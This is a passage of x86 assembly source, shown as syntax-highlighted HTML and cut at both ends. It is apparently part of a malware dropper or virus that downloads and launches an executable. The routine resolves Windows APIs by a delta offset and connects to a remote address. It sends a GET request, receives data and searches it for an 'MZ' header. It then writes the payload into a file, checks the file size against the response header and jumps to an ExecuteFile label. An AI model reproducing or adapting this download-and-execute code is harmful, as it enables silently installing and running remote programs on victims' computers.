    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ainet_addr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket2.sin_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
    </span><span class="sc5">InstallerConnect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerConnectionError</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mysocket2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Aconnect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InstallerSendGetCommand</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InstallerConnect</span><span class="sc0">

    </span><span class="sc5">InstallerConnectionError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInstaller</span><span class="sc0">

    </span><span class="sc5">InstallerSendGetCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_getsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_get</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crlf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000h</span><span class="sc0">

    </span><span class="sc5">ReceiveLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">LastPart</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INSTALLER_RECEIVE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReceiveLoop</span><span class="sc0">

    </span><span class="sc5">LastPart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INSTALLER_RECEIVE</span><span class="sc0">

    </span><span class="sc5">SearchMz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">MzLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundExeMark</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">SearchZm</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MzLoop</span><span class="sc0">

    </span><span class="sc5">SearchZm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">ZmLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundExeMark</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">InstallerCloseSocket</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ZmLoop</span><span class="sc0">
    
    </span><span class="sc5">FoundExeMark</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">ZeroWindirString</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc5">InstallerGetSetWindowsDirectory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_WINDIR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_WINDIR</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">commandline</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nrbytes2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bytesread</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0"> 

    </span><span class="sc5">InstallerGetRealSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">irealsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">irealsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  

    </span><span class="sc5">InstallerCloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dmHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">InstallerFileSizeLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':htg'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerFoundSize</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerCloseSocket</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InstallerFileSizeLoop</span><span class="sc0">

    </span><span class="sc5">InstallerFoundSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sizestart</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc5">ExtractFileSizeLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundEndOfSizeString</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerCloseSocket</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtractFileSizeLoop</span><span class="sc0">

    </span><span class="sc5">FoundEndOfSizeString</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sizesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sizestart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    
    </span><span class="sc5">Convert2Int</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InstallerCheckFileSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Convert2Int</span><span class="sc0">

    </span><span class="sc5">InstallerCheckFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ifilesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">irealsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExecuteFile</span><span class="sc0">
